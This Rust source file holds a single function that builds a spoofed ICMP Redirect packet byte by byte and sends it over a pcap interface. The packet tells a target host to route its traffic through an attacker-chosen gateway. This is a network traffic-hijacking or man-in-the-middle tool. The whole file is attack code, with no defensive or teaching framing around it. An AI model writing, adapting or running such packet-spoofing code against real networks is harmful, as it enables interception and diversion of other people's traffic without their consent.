use crate::utils::{compute_ipv4_checksum, open_capture};

pub fn send_redirect(
    interface: &str,
    target_ip: [u8; 4],
    new_gateway: [u8; 4],
) -> Result<(), String> {
    let mut cap = open_capture(interface)?;

    // Ethernet header placeholder: broadcast destination, zero source if unknown
    let mut packet = Vec::new();
    packet.extend_from_slice(&[0xff; 6]);
    packet.extend_from_slice(&[0x00; 6]);
    packet.extend_from_slice(&[0x08, 0x00]);

    // IPv4 header (minimal)
    packet.push(0x45);
    packet.push(0x00);
    packet.extend_from_slice(&[0x00, 0x3c]); // length placeholder
    packet.extend_from_slice(&[0x00, 0x00]);
    packet.extend_from_slice(&[0x40, 0x00]);
    packet.push(64);
    packet.push(1); // ICMP
    packet.extend_from_slice(&[0x00, 0x00]);
    packet.extend_from_slice(&new_gateway);
    packet.extend_from_slice(&target_ip);

    // ICMP redirect
    packet.push(5);
    packet.push(1);
    packet.extend_from_slice(&[0x00, 0x00]);
    packet.extend_from_slice(&new_gateway);
    packet.extend_from_slice(&[0x45, 0x00, 0x00, 0x1c]); // embed minimal IP header of original packet
    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);
    packet.extend_from_slice(&[0x40, 0x06, 0x00, 0x00]);
    packet.extend_from_slice(&target_ip);
    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);

    let total_len = packet.len() as u16 - 14; // exclude ethernet
    let len_bytes = total_len.to_be_bytes();
    packet[16] = len_bytes[0];
    packet[17] = len_bytes[1];

    let ip_checksum = compute_ipv4_checksum(&packet[14..34]);
    packet[24] = ip_checksum[0];
    packet[25] = ip_checksum[1];

    let icmp_checksum = compute_ipv4_checksum(&packet[34..]);
    packet[36] = icmp_checksum[0];
    packet[37] = icmp_checksum[1];

    cap.sendpacket(packet)
        .map_err(|e| format!("pcap send error: {e}"))
}
